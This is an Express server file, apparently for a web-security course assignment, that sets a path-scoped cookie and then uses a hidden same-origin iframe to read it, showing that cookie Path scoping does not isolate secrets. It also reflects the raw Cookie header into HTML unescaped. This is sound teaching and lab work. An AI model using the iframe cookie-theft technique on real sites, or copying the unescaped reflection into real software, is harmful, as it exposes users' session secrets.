// server.js
// Node/Express static server for assignment 4
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const app = express();
app.use(cookieParser());
const PORT = 3000;

app.use('/', express.static(path.join(__dirname)));

app.get('/frame-path-attack/victim/set-cookie', (req, res) => {
  res.setHeader('Set-Cookie', 'secretSess=SECRETVALUE123; Path=/frame-path-attack/secret; SameSite=None');
  res.send(`<html><body>
    <h3>Victim set cookie</h3>
    <p>Set cookie: secretSess=SECRETVALUE123; Path=/frame-path-attack/secret</p>
    <a href="/frame-path-attack/parent">Go to parent demo</a>
  </body></html>`);
});

app.get('/frame-path-attack/secret/echo', (req, res) => {
  res.send(`<html><body>
    <h3>Echo of document.cookie</h3>
    <div id="ck">${req.headers.cookie || ''}</div>
    <script>document.getElementById('ck').innerText = document.cookie;</script>
  </body></html>`);
});

app.get('/frame-path-attack/parent', (req, res) => {
  res.send(`<html><body>
    <h2>Parent page (attacker controllable origin)</h2>
    <p>Will create a hidden iframe to /frame-path-attack/secret/echo and attempt to read document.cookie exposed there.</p>
    <button id="start">Start steal attempt</button>
    <pre id="out"></pre>
    <script>
    document.getElementById('start').addEventListener('click', async () => {
      const iframe = document.createElement('iframe');
      iframe.style.display='none';
      iframe.src = '/frame-path-attack/secret/echo';
      document.body.appendChild(iframe);
      iframe.onload = () => {
        try {
          const text = iframe.contentWindow.document.body.innerText;
          document.getElementById('out').innerText = 'Read from iframe body:\\n' + text;
        } catch (e) {
          document.getElementById('out').innerText = 'Cannot read iframe: ' + e;
        }
      };
    });
    </script>
  </body></html>`);
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Open http://localhost:${PORT}/framable/<site>.html to test individual sites.`);
  console.log(`Frame-path demo: http://localhost:${PORT}/frame-path-attack/victim/set-cookie`);
});